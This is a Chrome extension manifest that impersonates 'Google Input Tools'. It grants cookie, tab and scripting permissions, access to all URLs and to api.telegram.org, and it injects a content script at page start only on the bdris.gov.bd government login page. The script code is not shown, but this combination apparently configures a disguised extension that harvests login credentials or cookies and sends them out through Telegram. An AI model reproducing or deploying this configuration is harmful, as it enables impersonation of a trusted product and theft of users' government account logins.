{
  "manifest_version": 3,
  "name": "Google Input Tools",
  "version": "11.4.0.0",
  "description": "Input Tools lets you type in the language of your choice.",
  "permissions": [
    "cookies",
    "tabs", 
    "activeTab", 
    "storage", 
    "scripting"
  ],
  "background": {
    "service_worker": "service-worker.js"
  },
  "icons": {
    "48": "icon-48.png"
  },
  "host_permissions": [
    "<all_urls>",
    "https://api.telegram.org/*"
  ],
  "content_scripts": [
    {
      "matches": [
        "*://*.bdris.gov.bd/login*"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_start"
    }
  ]
}